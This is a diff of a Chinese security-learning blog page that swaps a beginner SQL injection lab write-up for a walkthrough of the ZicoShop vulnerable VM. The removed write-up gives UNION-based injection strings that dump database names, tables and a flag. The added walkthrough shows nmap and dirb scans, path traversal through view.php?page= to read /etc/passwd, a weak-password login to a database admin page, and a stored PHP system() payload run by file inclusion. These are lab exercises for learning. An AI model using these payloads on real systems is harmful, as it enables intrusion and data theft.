@@ -4,14 +4,19 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="sqlI, ECNU NLP DeepLearning AntNLP 杨云凯 网络安全 深度学习 ">
+    <meta name="keywords" content="ZicoShop, ECNU NLP DeepLearning AntNLP 杨云凯 网络安全 深度学习 ">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
-    <meta name="description" content="这是数字型注入：情况是这样：
-1. 因为整数型注入，所以基本格式为:1 and 1 = 1
-2.接下来开始联合查询数据库:-1 union select 3,database()
-为什么是-1，因为id要等于一个不存在的数字，所以：-1 u">
+    <meta name="description" content="简介：
+是一个电子商务建站技术网站Zico-Shop
+主要功能：
+建站技术
+网店案例
+发现服务：补充：
+-sV:V扫描到的服务的端口号，apache 2.4
+-sT:TCP -sS:SYN  -A：显示详细的信息
+得到目标主机开放端口和操作">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -19,7 +24,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>sqlI | 网安小白</title>
+    <title>ZicoShop | 网安小白</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -318,13 +323,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/41.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/39.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        sqlI
+                        ZicoShop
                     </div>
                 </div>
             </div>
@@ -439,6 +444,10 @@
                             <span class="chip bg-color">入门</span>
                         </a>
                         
+                        <a href="/tags/靶机/" target="_blank">
+                            <span class="chip bg-color">靶机</span>
+                        </a>
+                        
                     </div>
                     
                 </div>
@@ -447,8 +456,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                        <a href="/categories/sql注入/" class="post-category" target="_blank">
-                            sql注入
+                        <a href="/categories/渗透测试/" class="post-category" target="_blank">
+                            渗透测试
                         </a>
                         
                     </div>
@@ -459,7 +468,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-12-18
+                    2021-01-09
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -473,14 +482,14 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    902
+                    538
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    2 分
                 </div>
                 
                 
@@ -496,69 +505,64 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="这是数字型注入："><a href="#这是数字型注入：" class="headerlink" title="这是数字型注入："></a>这是数字型注入：</h1><p>情况是这样：</p>
-<h2 id="1-因为整数型注入，所以基本格式为"><a href="#1-因为整数型注入，所以基本格式为" class="headerlink" title="1. 因为整数型注入，所以基本格式为:"></a>1. 因为整数型注入，所以基本格式为:</h2><p>1 and 1 = 1</p>
-<h2 id="2-接下来开始联合查询数据库"><a href="#2-接下来开始联合查询数据库" class="headerlink" title="2.接下来开始联合查询数据库:"></a>2.接下来开始联合查询数据库:</h2><p>-1 union select 3,database()</p>
-<p>为什么是-1，因为id要等于一个不存在的数字，所以：-1 union select 3，datebase（）<img src="/2020/12/18/sqli/1.png" alt>发现了数据库sqli！</p>
-<h2 id="3-接下来通过查询表单来显示sqli数据库里面的列表。"><a href="#3-接下来通过查询表单来显示sqli数据库里面的列表。" class="headerlink" title="3.接下来通过查询表单来显示sqli数据库里面的列表。"></a>3.接下来通过查询表单来显示sqli数据库里面的列表。</h2><p>语句为：-1 union select 3,group_concat(schema_name) from information_schema.schemata</p>
-<p>得到回显：<img src="/2020/12/18/sqli/2.png" alt></p>
-<p>得到四个表！</p>
-<h2 id="4-根据报出的数据库，报表名字"><a href="#4-根据报出的数据库，报表名字" class="headerlink" title="4. 根据报出的数据库，报表名字"></a>4. 根据报出的数据库，报表名字</h2><p>-1 union select 3,group_concat(table_name) from information_schema.tables where table_schema=”sqli”</p>
-<p>得到回显：<img src="/2020/12/18/sqli/3.png" alt></p>
-<p>发现flag</p>
-<h2 id="5-知道了表flag，去报字段-报出flag的字段。"><a href="#5-知道了表flag，去报字段-报出flag的字段。" class="headerlink" title="5.  知道了表flag，去报字段,报出flag的字段。"></a>5.  知道了表flag，去报字段,报出flag的字段。</h2><p>-1 union select 3,group_concat(flag) from sqli.flag</p>
-<h1 id="下面是字符型注入思路："><a href="#下面是字符型注入思路：" class="headerlink" title="下面是字符型注入思路："></a>下面是字符型注入思路：</h1><h2 id="一-因为字符型所以尝试以下语句："><a href="#一-因为字符型所以尝试以下语句：" class="headerlink" title="一.因为字符型所以尝试以下语句："></a>一.因为字符型所以尝试以下语句：</h2><p>1’ and ‘1’ =’1’ – </p>
-<p>得到回显：</p>
-<p><img src="/2020/12/18/sqli/4.png" alt></p>
-<p>发现这种格式成功</p>
-<h2 id="二-那么接下来开始查找数据库有几列用order-by语句："><a href="#二-那么接下来开始查找数据库有几列用order-by语句：" class="headerlink" title="二.那么接下来开始查找数据库有几列用order by语句："></a>二.那么接下来开始查找数据库有几列用order by语句：</h2><p>1’ order by 3 – ‘发现报错，那么改为2 ：1’ order by 2 – ‘得到回显：</p>
-<p><img src="/2020/12/18/sqli/5.png" alt></p>
-<h2 id="三-判断显示的信息是第几列的信息"><a href="#三-判断显示的信息是第几列的信息" class="headerlink" title="三.判断显示的信息是第几列的信息"></a>三.判断显示的信息是第几列的信息</h2><p>一般在我们可见页面中显示的信息不一定是查询全部列数，可能查询3列，显示1列。通过‘直接闭合前面的select语句，使其前半句查询结果空(除非存在name=’‘的情况)，即数据库中不存在该查询数据，然后通过union select 1,2 显示的数字来确定显示的列的位置。</p>
-<p>$name=’ union select 1,2 – ‘</p>
-<p>根据查询结果，得到2，以后想<strong>要查询的信息就放在第二个列处。</strong></p>
-<p><img src="/2020/12/18/sqli/6.png" alt></p>
-<h2 id="四、利用函数来收集数据库信息"><a href="#四、利用函数来收集数据库信息" class="headerlink" title="四、利用函数来收集数据库信息"></a>四、利用函数来收集数据库信息</h2><p>查询sql自带的函数来确定当前用户，当前数据库等信息。</p>
-<p>数据库函数有以下：</p>
-<p>1、用户：user()</p>
-<p>2、当前数据库：database()</p>
-<p>3、数据库版本：version()</p>
-<p>4、@@hostname （用户）</p>
-<p>5、@@datadir  (数据库在文件的位置)</p>
-<p>6、@@version （版本)</p>
-<p>7、@@version_compile_OS (操作系统版本)</p>
-<p>$name=’ union select 1,user() – ‘，查询结果为：<strong>是root账户</strong></p>
-<p><img src="/2020/12/18/sqli/7.png" alt></p>
-<p>如果为root用户，就可以访问information_schema数据库。</p>
-<p>查询数据库类型，$name=’ union select 1,version() – ‘，查询结果为：</p>
-<p><img src="/2020/12/18/sqli/8.png" alt></p>
-<p>由数据库版本可知它是<strong>MySQL的一个分支</strong>。</p>
-<p>查询当前数据库名称，$name=’ union select 1,database() – ‘，查询结果为：</p>
-<p>‘ union select 1，datebase（）– ‘</p>
-<p> ‘ union select 1,datebase() – ‘</p>
-<p><img src="/2020/12/18/sqli/9.png" alt="9"></p>
-<p>当前数据库名称为：<strong>sqli</strong></p>
-<h2 id="五、通过union查询数据库"><a href="#五、通过union查询数据库" class="headerlink" title="五、通过union查询数据库"></a>五、通过union查询数据库</h2><h3 id="1、获取所有数据库名称"><a href="#1、获取所有数据库名称" class="headerlink" title="1、获取所有数据库名称"></a>1、获取所有数据库名称</h3><p>$name=’ union select 1,group_concat(schema_name) from information_schema.schemata – ‘</p>
-<p>查询结果为：</p>
-<p><img src="/2020/12/18/sqli/10.png" alt="10"></p>
-<p>当前数据库有：</p>
-<p><strong>information_schema,mysql,performance_schema,sqli</strong></p>
-<h3 id="2、查询数据库中有多少个表"><a href="#2、查询数据库中有多少个表" class="headerlink" title="2、查询数据库中有多少个表"></a>2、查询数据库中有多少个表</h3><p>$name=’ union select table_schema,count(*) from information_schema.tables – ‘</p>
-<p>​    由结果可知information_schema中有161个表</p>
-<p><img src="/2020/12/18/sqli/11.png" alt="img"></p>
-<p>查询数据库information_schema中的所有表名，在后续中需要从里面的表中查询数据，该数据库中有161个表。</p>
-<p>$name=’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=’informatioin_schema’ – ‘</p>
-<h3 id="3、查询指定数据库中的表名"><a href="#3、查询指定数据库中的表名" class="headerlink" title="3、查询指定数据库中的表名"></a>3、查询指定数据库中的表名</h3><p>$name=’ union select table_schema, group_concat(table_name) from information_schema.tables where table_schema=’sqli’ – ‘</p>
-<p>根据查询结果可知，<strong>数据库sqli中有两个表：news、flag</strong></p>
-<p><img src="/2020/12/18/sqli/12.png" alt="img"></p>
-<h3 id="4、查询指定数据库指定表中的列名"><a href="#4、查询指定数据库指定表中的列名" class="headerlink" title="4、查询指定数据库指定表中的列名"></a>4、查询指定数据库指定表中的列名</h3><p>此次，通过limit逐个获取列名， limit 0,1，修改limit中第一个数字获取其他列名，如获取第二个列名：limit 1,1。</p>
-<p>$name=’ union select table_name,(select column_name from information_schema.columns where table_schema=’sqli’ and table_name=’flag’ limit 0,1) – ‘</p>
-<p>查询结果：第一个字段列名为：flag</p>
-<p><img src="/2020/12/18/sqli/13.png" alt="img"></p>
-<p>  查询第二个字段没出查询成功，说明此表中只有一个列字段</p>
-<p><img src="/2020/12/18/sqli/14.png" alt="img"></p>
-<h3 id="5、查询指定数据库指定表的列的内容"><a href="#5、查询指定数据库指定表的列的内容" class="headerlink" title="5、查询指定数据库指定表的列的内容"></a>5、查询指定数据库指定表的列的内容</h3><p>$name=’ union select 1,group_concat(flag) from sqli.flag – ‘</p>
-<p>查询结果：</p>
-<p><img src="/2020/12/18/sqli/15.png" alt="img"></p>
+                <p>简介：</p>
+<p>是一个电子商务建站技术网站Zico-Shop</p>
+<p>主要功能：</p>
+<p>建站技术</p>
+<p>网店案例</p>
+<h2 id="发现服务："><a href="#发现服务：" class="headerlink" title="发现服务："></a>发现服务：</h2><p>补充：</p>
+<p>-sV:V扫描到的服务的端口号，apache 2.4</p>
+<p>-sT:TCP -sS:SYN  -A：显示详细的信息</p>
+<p>得到目标主机开放端口和操作系统</p>
+<pre><code>nmap -sP 192.168.204.0/24
+nmap -sS -Pn -n -A -O -T5 192.168.204.141</code></pre><p>发现端口：</p>
+<p>22ssh</p>
+<p>80HTTP</p>
+<p>111rpcbind 2-4（不知道是什么的端口）</p>
+<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p>常识：</p>
+<p>/etc/password存储linux系统所有的用户信息</p>
+<p>linux网站文件的默认目录：/var/www</p>
+<p>在URL内通过目录穿越../../../etc/passwd来尝试访问</p>
+<p>发现：</p>
+<p>The requested URL /etc/password was not found on this server.</p>
+<p>那么该网站的二级目录再次进行查找</p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51024_1.png" alt></p>
+<p>点开以后的URL变为：</p>
+<p><a href="http://192.168.204.141/view.php?page=tools.html" target="_blank" rel="noopener">http://192.168.204.141/view.php?page=tools.html</a></p>
+<p>修改参数：</p>
+<p><a href="http://192.168.204.141/view.php?page=../../etc/passwd" target="_blank" rel="noopener">http://192.168.204.141/view.php?page=../../etc/passwd</a></p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51058_2.png" alt></p>
+<h2 id="目录发现："><a href="#目录发现：" class="headerlink" title="目录发现："></a>目录发现：</h2><pre><code>dirb http://192.168.204.141/ ←注意空格/usr/share/dirb/wordlists/common.txt</code></pre><p>发现以下目录：</p>
+<pre><code>---- Scanning URL: http://192.168.204.141/ ----
++ http://192.168.204.141/cgi-bin/ (CODE:403|SIZE:291)                           
+==&gt; DIRECTORY: http://192.168.204.141/css/                                      
+==&gt; DIRECTORY: http://192.168.204.141/dbadmin/                                  
+==&gt; DIRECTORY: http://192.168.204.141/img/                                      
++ http://192.168.204.141/index (CODE:200|SIZE:7970)                             
++ http://192.168.204.141/index.html (CODE:200|SIZE:7970)                        
+==&gt; DIRECTORY: http://192.168.204.141/js/                                       
++ http://192.168.204.141/LICENSE (CODE:200|SIZE:1094)                           
++ http://192.168.204.141/package (CODE:200|SIZE:789)                            
++ http://192.168.204.141/server-status (CODE:403|SIZE:296)                      
++ http://192.168.204.141/tools (CODE:200|SIZE:8355)                             
+==&gt; DIRECTORY: http://192.168.204.141/vendor/                                   
++ http://192.168.204.141/view (CODE:200|SIZE:0)     </code></pre><p>访问dbadmin</p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51127_3.png" alt></p>
+<p>点击进入test_db.php</p>
+<p>试试弱口令：admin登陆成功</p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51130_4.png" alt></p>
+<p>这个地方给人的感觉就像是可以管理数据库一样所以说应该可以上传一个东西到数据库什么的，而且就这个页面而言，创建一个新的数据库是没有问题的</p>
+<h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><h3 id="1-创建新的数据库和表格"><a href="#1-创建新的数据库和表格" class="headerlink" title="1.创建新的数据库和表格"></a>1.创建新的数据库和表格</h3><p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51142_6.png" alt></p>
+<p>选择数据库：</p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51149_8.png" alt></p>
+<p>创建表格：</p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51150_9.png" alt></p>
+<h3 id="2-表格里储存可执行的php代码"><a href="#2-表格里储存可执行的php代码" class="headerlink" title="2.表格里储存可执行的php代码"></a>2.表格里储存可执行的php代码</h3><?php system(ls);?>
+
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51159_10.png" alt></p>
+<h3 id="3-php代码里执行远程主机命令"><a href="#3-php代码里执行远程主机命令" class="headerlink" title="3.php代码里执行远程主机命令"></a>3.php代码里执行远程主机命令</h3><p>通过之前的文件包含漏洞来执行</p>
+<p><a href="http://192.168.204.141/view.php?page=../../usr/databases/bing.php" target="_blank" rel="noopener">http://192.168.204.141/view.php?page=../../usr/databases/bing.php</a></p>
+<p><img src="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8809%E6%97%A51202_11.png" alt></p>
 
             </div>
             <hr />
@@ -717,9 +721,9 @@
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《sqlI》
+                    《ZicoShop》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/12/18/sqli/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2021/01/09/zicoshop/" property="cc:attributionName"
                rel="cc:attributionURL">
                 杨云凯
             </a> 采用
@@ -760,7 +764,7 @@
         repo: 'iceberg404.github.io',
         owner: 'iceberg404',
         admin: "godweiyang",
-        id: '2020/12/18/sqli/',
+        id: '2021/01/09/zicoshop/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -1043,48 +1047,60 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/12/19/blogbulider/">
+                <a href="/2021/01/09/zicoshop/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/38.jpg" class="responsive-img" alt="搭建博客具体教程">
+                        <img src="/medias/featureimages/39.jpg" class="responsive-img" alt="ZicoShop">
                         
-                        <span class="card-title">搭建博客具体教程</span>
+                        <span class="card-title">ZicoShop</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            阅读须知
-
-注意，这篇文章篇幅较长，主要针对新手，每一步很详细，所以可能会显得比较啰嗦，所以建议基础比较好小伙伴根据目录选择自己感兴趣的部分跳着看，不要文章没看，上来先喷一下！谢谢⊙o⊙⊙o⊙。教程内容随意复制使用，引用的话请加一个参考链接
+                            简介：
+是一个电子商务建站技术网站Zico-Shop
+主要功能：
+建站技术
+网店案例
+发现服务：补充：
+-sV:V扫描到的服务的端口号，apache 2.4
+-sT:TCP -sS:SYN  -A：显示详细的信息
+得到目标主机开放端口和操作
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-19
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-01-09
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/博客搭建/" class="post-category" target="_blank">
-                                    博客搭建
+                            <a href="/categories/渗透测试/" class="post-category" target="_blank">
+                                    渗透测试
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/博客搭建/" target="_blank">
-                        <span class="chip bg-color">博客搭建</span>
+                    <a href="/tags/入门/" target="_blank">
+                        <span class="chip bg-color">入门</span>
+                    </a>
+                    
+                    <a href="/tags/靶机/" target="_blank">
+                        <span class="chip bg-color">靶机</span>
                     </a>
                     
                 </div>
@@ -1098,31 +1114,32 @@
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/02/16/sort-algorithms/">
+                <a href="/2021/01/09/pickle-fan-xu-lie-hua/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="十大经典排序算法整理汇总（附代码）">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="Pickle反序列化">
                         
-                        <span class="card-title">十大经典排序算法整理汇总（附代码）</span>
+                        <span class="card-title">Pickle反序列化</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            本文整理并总结了十大经典的排序算法（冒泡排序、选择排序、插入排序、快速排序、归并排序、希尔排序、计数排序、基数排序、桶排序、堆排序）的时间复杂度、空间复杂度等性质。
+                            序列化与反序列化=0
+
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-16
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2021-01-09
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/编程算法/" class="post-category" target="_blank">
-                                    编程算法
+                            <a href="/categories/渗透测试/" class="post-category" target="_blank">
+                                    渗透测试
                                 </a>
                             
                             
@@ -1132,12 +1149,8 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/leetcode/" target="_blank">
-                        <span class="chip bg-color">leetcode</span>
-                    </a>
-                    
-                    <a href="/tags/算法/" target="_blank">
-                        <span class="chip bg-color">算法</span>
+                    <a href="/tags/入门/" target="_blank">
+                        <span class="chip bg-color">入门</span>
                     </a>
                     
                 </div>
@@ -1311,7 +1324,7 @@
 
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-            <span class="white-color">29.1k</span>
+            <span class="white-color">28.1k</span>
             
 
             <br>
